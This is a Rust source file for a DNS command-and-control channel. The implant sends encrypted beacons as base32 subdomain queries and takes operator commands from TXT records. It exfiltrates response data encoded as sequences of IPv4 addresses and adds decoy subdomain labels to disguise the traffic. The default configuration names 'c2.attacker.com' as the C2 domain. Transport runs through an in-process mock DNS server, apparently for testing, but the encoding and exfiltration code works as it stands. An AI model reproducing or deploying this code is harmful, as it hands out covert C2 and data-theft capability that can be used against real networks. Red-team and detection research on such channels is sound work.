use std::collections::HashMap;
use std::fmt;
use std::sync::{Arc, Mutex};

use serde::{Deserialize, Serialize};

use crate::c2_protocol::{
    BeaconMessage, C2Message, C2ProtocolError, CommandMessage, SessionCipher,
};
use crate::covert_channel::{base32_decode, base32_encode};

/// Maximum DNS label length per RFC 1035.
const MAX_LABEL_LEN: usize = 63;

/// Maximum total DNS name length.
const MAX_DNS_NAME_LEN: usize = 253;

/// Errors specific to the DNS C2 channel.
#[derive(Debug)]
pub enum DnsC2Error {
    Protocol(C2ProtocolError),
    EncodingFailed(String),
    DecodingFailed(String),
    NoCommandPending,
    ImplantNotFound(String),
    PayloadTooLarge,
}

impl fmt::Display for DnsC2Error {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Protocol(e) => write!(f, "protocol error: {e}"),
            Self::EncodingFailed(msg) => write!(f, "encoding failed: {msg}"),
            Self::DecodingFailed(msg) => write!(f, "decoding failed: {msg}"),
            Self::NoCommandPending => write!(f, "no command pending"),
            Self::ImplantNotFound(id) => write!(f, "implant not found: {id}"),
            Self::PayloadTooLarge => write!(f, "payload too large for DNS transport"),
        }
    }
}

impl std::error::Error for DnsC2Error {}

impl From<C2ProtocolError> for DnsC2Error {
    fn from(e: C2ProtocolError) -> Self {
        Self::Protocol(e)
    }
}

/// Configuration for the DNS C2 channel.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsC2Config {
    pub base_domain: String,
    pub implant_id: String,
    pub max_label_len: usize,
    pub jitter_ms: u64,
    pub ttl_secs: u32,
}

impl Default for DnsC2Config {
    fn default() -> Self {
        Self {
            base_domain: "c2.attacker.com".to_string(),
            implant_id: "imp01".to_string(),
            max_label_len: MAX_LABEL_LEN,
            jitter_ms: 500,
            ttl_secs: 60,
        }
    }
}

/// Encode a beacon message into DNS subdomain queries.
///
/// Format: `{seq}.{chunk_b32}.{implant_id}.c2.{base_domain}` → TXT record lookup
///
/// The CBOR-serialized, encrypted beacon is split across multiple DNS queries
/// with base32-encoded chunks as subdomain labels.
pub fn encode_beacon_as_dns_queries(
    beacon: &BeaconMessage,
    cipher: &SessionCipher,
    config: &DnsC2Config,
) -> Result<Vec<String>, DnsC2Error> {
    let msg = C2Message::Beacon(beacon.clone());
    let cbor = crate::c2_protocol::serialize_message(&msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    let encoded = base32_encode(&encrypted);

    let suffix = format!(".{}.c2.{}", config.implant_id, config.base_domain);
    let seq_prefix_len = 5; // "0000."
    let available_per_query =
        MAX_DNS_NAME_LEN.saturating_sub(suffix.len() + seq_prefix_len + 1);
    let label_limit = config.max_label_len.min(MAX_LABEL_LEN);
    let chunk_size = available_per_query.min(label_limit);

    if chunk_size == 0 {
        return Err(DnsC2Error::EncodingFailed(
            "domain too long for any data".to_string(),
        ));
    }

    let mut queries = Vec::new();
    let mut offset = 0;
    let mut seq: u32 = 0;

    while offset < encoded.len() {
        let end = (offset + chunk_size).min(encoded.len());
        let chunk = &encoded[offset..end];
        let query = format!("{seq:04x}.{chunk}{suffix}");
        queries.push(query);
        offset = end;
        seq += 1;
    }

    Ok(queries)
}

/// Decode DNS queries back to an encrypted beacon payload.
///
/// Reassembles base32 chunks from subdomain labels, decrypts, and
/// deserializes the beacon message.
pub fn decode_dns_queries_to_beacon(
    queries: &[String],
    cipher: &SessionCipher,
    config: &DnsC2Config,
) -> Result<BeaconMessage, DnsC2Error> {
    let suffix = format!(".{}.c2.{}", config.implant_id, config.base_domain);

    let mut parts: Vec<(u32, String)> = Vec::new();
    for query in queries {
        let stripped = query
            .strip_suffix(&suffix)
            .ok_or_else(|| DnsC2Error::DecodingFailed("bad suffix".to_string()))?;
        let dot_pos = stripped
            .find('.')
            .ok_or_else(|| DnsC2Error::DecodingFailed("no seq separator".to_string()))?;
        let seq_str = &stripped[..dot_pos];
        let seq = u32::from_str_radix(seq_str, 16)
            .map_err(|e| DnsC2Error::DecodingFailed(format!("bad seq: {e}")))?;
        let data_part = &stripped[dot_pos + 1..];
        parts.push((seq, data_part.to_string()));
    }
    parts.sort_by_key(|(seq, _)| *seq);

    let encoded: String = parts.into_iter().map(|(_, d)| d).collect();
    let encrypted = base32_decode(&encoded)
        .ok_or_else(|| DnsC2Error::DecodingFailed("base32 decode failed".to_string()))?;
    let cbor = cipher.decrypt(&encrypted)?;
    let msg = crate::c2_protocol::deserialize_message(&cbor)?;

    match msg {
        C2Message::Beacon(b) => Ok(b),
        _ => Err(DnsC2Error::DecodingFailed(
            "expected beacon message".to_string(),
        )),
    }
}

/// Encode a command as a DNS TXT record response value.
///
/// The operator encodes `CommandMessage` into a base32 string that fits
/// in a TXT record (max ~255 chars per string, can chain).
pub fn encode_command_as_txt(
    cmd: &CommandMessage,
    cipher: &SessionCipher,
) -> Result<String, DnsC2Error> {
    let msg = C2Message::Command(cmd.clone());
    let cbor = crate::c2_protocol::serialize_message(&msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    Ok(base32_encode(&encrypted))
}

/// Decode a TXT record value back to a command message.
pub fn decode_txt_to_command(
    txt: &str,
    cipher: &SessionCipher,
) -> Result<CommandMessage, DnsC2Error> {
    let encrypted = base32_decode(txt)
        .ok_or_else(|| DnsC2Error::DecodingFailed("base32 decode failed".to_string()))?;
    let cbor = cipher.decrypt(&encrypted)?;
    let msg = crate::c2_protocol::deserialize_message(&cbor)?;
    match msg {
        C2Message::Command(c) => Ok(c),
        _ => Err(DnsC2Error::DecodingFailed(
            "expected command message".to_string(),
        )),
    }
}

/// Encode response data as a sequence of IP addresses (A record exfil).
///
/// Each 4 bytes of data map to one IPv4 address. Prefix with a 4-byte
/// length header so the receiver knows when the stream ends.
pub fn encode_response_as_ip_sequence(data: &[u8]) -> Vec<String> {
    let len_bytes = (data.len() as u32).to_be_bytes();
    let mut all_bytes = Vec::with_capacity(4 + data.len());
    all_bytes.extend_from_slice(&len_bytes);
    all_bytes.extend_from_slice(data);

    // Pad to multiple of 4
    while all_bytes.len() % 4 != 0 {
        all_bytes.push(0);
    }

    all_bytes
        .chunks(4)
        .map(|chunk| format!("{}.{}.{}.{}", chunk[0], chunk[1], chunk[2], chunk[3]))
        .collect()
}

/// Decode a sequence of IP addresses back to response data.
pub fn decode_ip_sequence_to_response(ips: &[String]) -> Result<Vec<u8>, DnsC2Error> {
    if ips.is_empty() {
        return Err(DnsC2Error::DecodingFailed("empty IP sequence".to_string()));
    }

    let mut raw = Vec::new();
    for ip in ips {
        let octets: Result<Vec<u8>, _> = ip.split('.').map(|s| s.parse::<u8>()).collect();
        let octets =
            octets.map_err(|e| DnsC2Error::DecodingFailed(format!("bad IP octet: {e}")))?;
        if octets.len() != 4 {
            return Err(DnsC2Error::DecodingFailed("IP must have 4 octets".to_string()));
        }
        raw.extend_from_slice(&octets);
    }

    if raw.len() < 4 {
        return Err(DnsC2Error::DecodingFailed("too short for length header".to_string()));
    }

    let len = u32::from_be_bytes([raw[0], raw[1], raw[2], raw[3]]) as usize;
    let payload = &raw[4..];
    if payload.len() < len {
        return Err(DnsC2Error::DecodingFailed("payload shorter than declared length".to_string()));
    }

    Ok(payload[..len].to_vec())
}

/// Generate random-looking subdomain labels for stealth queries.
///
/// Mixes real data queries with legitimate-looking cover traffic labels.
pub fn generate_cover_labels(count: usize) -> Vec<String> {
    let prefixes = [
        "www", "mail", "api", "cdn", "static", "img", "assets", "ns1", "ns2",
        "vpn", "dev", "staging", "app", "auth", "login", "help",
    ];
    let mut labels = Vec::with_capacity(count);
    for i in 0..count {
        labels.push(prefixes[i % prefixes.len()].to_string());
    }
    labels
}

/// In-process mock DNS server for testing the DNS C2 channel.
///
/// Stores TXT records and pending commands keyed by query domain.
/// The implant side queries this mock instead of real DNS.
#[derive(Debug, Clone)]
pub struct MockDnsServer {
    txt_records: Arc<Mutex<HashMap<String, String>>>,
    pending_commands: Arc<Mutex<HashMap<String, Vec<String>>>>,
}

impl MockDnsServer {
    pub fn new() -> Self {
        Self {
            txt_records: Arc::new(Mutex::new(HashMap::new())),
            pending_commands: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Set a TXT record response for a given query domain.
    pub fn set_txt_record(&self, domain: &str, value: &str) {
        let mut records = self.txt_records.lock().expect("lock");
        records.insert(domain.to_string(), value.to_string());
    }

    /// Query a TXT record (simulates DNS TXT lookup).
    pub fn query_txt(&self, domain: &str) -> Option<String> {
        let records = self.txt_records.lock().expect("lock");
        records.get(domain).cloned()
    }

    /// Queue a command for a specific implant.
    pub fn queue_command(&self, implant_id: &str, encoded_cmd: &str) {
        let key = format!("{implant_id}.cmd");
        let mut cmds = self.pending_commands.lock().expect("lock");
        cmds.entry(key).or_default().push(encoded_cmd.to_string());
    }

    /// Poll for the next pending command (implant side).
    pub fn poll_command(&self, implant_id: &str) -> Option<String> {
        let key = format!("{implant_id}.cmd");
        let mut cmds = self.pending_commands.lock().expect("lock");
        if let Some(queue) = cmds.get_mut(&key) {
            if !queue.is_empty() {
                return Some(queue.remove(0));
            }
        }
        None
    }
}

impl Default for MockDnsServer {
    fn default() -> Self {
        Self::new()
    }
}

/// DNS C2 client (implant side).
///
/// Encodes beacons as DNS queries, polls for commands via TXT records.
pub struct DnsC2Client {
    config: DnsC2Config,
    cipher: SessionCipher,
    dns: MockDnsServer,
}

impl DnsC2Client {
    pub fn new(config: DnsC2Config, key: &[u8; 32], dns: MockDnsServer) -> Self {
        Self {
            config,
            cipher: SessionCipher::new(key),
            dns,
        }
    }

    /// Send a beacon by encoding it as DNS subdomain queries.
    pub fn send_beacon(&self, beacon: &BeaconMessage) -> Result<Vec<String>, DnsC2Error> {
        encode_beacon_as_dns_queries(beacon, &self.cipher, &self.config)
    }

    /// Poll for a pending command from the operator.
    pub fn poll_command(&self) -> Result<Option<CommandMessage>, DnsC2Error> {
        match self.dns.poll_command(&self.config.implant_id) {
            Some(txt) => {
                let cmd = decode_txt_to_command(&txt, &self.cipher)?;
                Ok(Some(cmd))
            }
            None => Ok(None),
        }
    }
}

/// DNS C2 server (operator side).
///
/// Receives beacon DNS queries, queues commands for implants.
pub struct DnsC2Server {
    cipher: SessionCipher,
    config: DnsC2Config,
    dns: MockDnsServer,
    received_beacons: Vec<BeaconMessage>,
}

impl DnsC2Server {
    pub fn new(config: DnsC2Config, key: &[u8; 32], dns: MockDnsServer) -> Self {
        Self {
            cipher: SessionCipher::new(key),
            config,
            dns,
            received_beacons: Vec::new(),
        }
    }

    /// Process incoming beacon DNS queries and decode the beacon.
    pub fn receive_beacon(&mut self, queries: &[String]) -> Result<BeaconMessage, DnsC2Error> {
        let beacon = decode_dns_queries_to_beacon(queries, &self.cipher, &self.config)?;
        self.received_beacons.push(beacon.clone());
        Ok(beacon)
    }

    /// Queue a command to be delivered to an implant via DNS TXT.
    pub fn send_command(&self, cmd: &CommandMessage) -> Result<(), DnsC2Error> {
        let encoded = encode_command_as_txt(cmd, &self.cipher)?;
        self.dns.queue_command(&cmd.implant_id, &encoded);
        Ok(())
    }

    /// Access all received beacons.
    pub fn beacons(&self) -> &[BeaconMessage] {
        &self.received_beacons
    }
}

#[cfg(test)]
#[path = "c2_dns_test.rs"]
mod tests;
